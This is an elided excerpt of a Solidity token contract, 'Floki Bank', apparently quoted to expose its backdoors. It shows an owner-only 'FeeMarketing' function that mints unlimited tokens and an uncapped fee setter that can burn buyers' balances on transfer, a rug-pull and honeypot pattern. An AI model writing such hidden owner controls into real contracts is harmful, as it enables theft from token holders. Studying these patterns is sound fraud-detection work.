...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function FeeMarketing(uint256 amount) public onlyOwner {
    _Marketing(msg.sender, amount);
    }
    
    function setTaxFeePercent(uint256 BurnFee) external onlyOwner(){
        _feeLiquidity = BurnFee;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _feeLiquidity);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _feeLiquidity);
    ...
    function _Marketing(address account, uint256 amount) internal virtual {
...
contract FlokiBank  is ERC20 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC20("Floki Bank", "FB") {
        _Marketing(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}